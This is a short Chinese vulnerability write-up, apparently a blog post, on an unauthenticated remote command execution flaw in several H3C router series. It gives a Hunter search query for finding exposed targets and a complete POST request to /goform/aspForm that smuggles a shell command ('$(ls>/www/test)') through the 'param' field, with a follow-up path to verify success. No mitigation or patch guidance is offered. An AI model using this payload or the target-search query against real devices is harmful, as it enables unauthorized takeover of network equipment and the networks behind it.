#  H3C多系列路由器存在前台远程命令执行漏洞   
原创 骇客安全  骇客安全   2025-03-15 17:11  
  
# 一、漏洞简介  
  
 H3C多系列路由器存在前台远程命令执行漏洞。  
# 二、影响版本  
- H3C多系列路由器  
# 三、资产测绘  
- hunterapp.name="H3C Router Management"  
- 登录页面  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991N3yBaRTQjPXfQHWV5NwfVS2youBFHj3S3h89CL6sJq5UbM7y8s679mSvEIMicjEILibQnl7icg1KiabQ/640?wx_fmt=png&from=appmsg "null")  
# 四、漏洞复现  
```
POST /goform/aspForm HTTP/1.1
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
Host: 

CMD=DelL2tpLNSList&GO=vpn_l2tp_session.asp&param=1; $(ls>/www/test);
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991N3yBaRTQjPXfQHWV5NwfVSeHBDT7iceDUypqcwZ9OF3YyMP4WKD8zpSuHQj3mHzZ8tdTAJhrAGOeA/640?wx_fmt=png&from=appmsg "null")  
```
/test
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991N3yBaRTQjPXfQHWV5NwfVS6eKAOhH8sBCxv4PzdT7ZsKsE1VfKVLY9Z28EsqU40dLd3WkazsWLhw/640?wx_fmt=png&from=appmsg "null")  
  
  
  
